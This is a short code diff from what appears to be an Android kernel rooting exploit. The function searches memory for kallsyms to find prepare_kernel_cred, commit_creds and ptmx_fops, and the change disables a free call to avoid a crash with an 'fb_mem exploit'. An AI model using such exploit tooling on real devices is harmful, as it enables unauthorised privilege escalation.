@@ -110,7 +110,8 @@ bool find_variables_in_memory(void *mem, size_t length)
       }
     }
 
-    kallsyms_in_memory_free(info);
+    //FIXME: do not free to avoid crash with fb_mem exploit
+    //kallsyms_in_memory_free(info);
 
     if (prepare_kernel_cred && commit_creds && ptmx_fops) {
       return true;
